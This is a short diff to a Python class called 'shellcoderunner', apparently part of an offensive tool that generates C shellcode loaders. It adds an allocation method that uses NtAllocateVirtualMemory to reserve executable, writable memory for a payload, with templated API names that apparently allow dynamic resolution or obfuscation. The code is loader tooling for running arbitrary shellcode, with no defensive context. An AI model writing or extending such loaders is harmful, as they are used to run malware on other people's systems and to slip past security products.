@@ -23,7 +23,16 @@ class shellcoderunner:
     {HeapFree}(hHeap, 0, buffer);
     {HeapDestroy}(hHeap);
 """
-            self.apicallsList += ['HeapCreate', 'HeapAlloc', 'HeapFree', 'HeapDestroy']
+        elif self.allocation == 'NtAllocateVirtualMemory':
+            self.allocationCode = """
+    PVOID buffer = NULL;
+    SIZE_T allocationSize = {shellcodeSize};
+    {NtAllocateVirtualMemory}((HANDLE)-1, &buffer, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+"""
+            self.freeCode = """
+    {VirtualFree}(buffer, 0, MEM_RELEASE);
+"""
+            self.apicallsList += ['NtAllocateVirtualMemory', 'VirtualFree']
 
     def imports(self) -> list[str]:
         return ["#include <windows.h>", 
